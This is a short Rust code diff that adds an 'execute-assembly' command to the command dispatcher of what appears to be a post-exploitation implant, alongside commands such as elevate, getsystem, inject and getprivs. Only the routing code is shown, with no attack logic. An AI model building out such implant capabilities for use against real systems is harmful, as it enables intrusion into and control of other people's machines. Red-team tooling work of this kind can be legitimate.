@@ -13,6 +13,7 @@ mod cd;
 mod config;
 mod download;
 pub mod elevate;
+mod execute_assembly;
 pub mod getprivs;
 mod getsystem;
 mod inject;
@@ -57,6 +58,7 @@ pub enum CommandType {
     Config,
     Download,
     Elevate,
+    ExecuteAssembly,
     Getprivs,
     Getsystem,
     Inject,
@@ -184,6 +186,7 @@ impl NotionCommand {
                 "config"       => CommandType::Config,
                 "download"     => CommandType::Download,
                 "elevate"      => CommandType::Elevate,
+                "execute-assembly" => CommandType::ExecuteAssembly,
                 "getprivs"     => CommandType::Getprivs,
                 "getsystem"    => CommandType::Getsystem,
                 "inject"       => CommandType::Inject,
@@ -216,6 +219,7 @@ impl NotionCommand {
             CommandType::Cd           => cd::handle(&mut self.args),
             CommandType::Config       => config::handle(&mut self.args, config_options, logger).await,
             CommandType::Download     => download::handle( &mut self.args, logger).await,
+            CommandType::ExecuteAssembly => execute_assembly::handle(&mut self.args, logger).await,
             CommandType::Elevate      => elevate::handle(&mut self.args, config_options).await,
             CommandType::Getprivs     => getprivs::handle().await,
             CommandType::Getsystem    => getsystem::handle(logger).await,
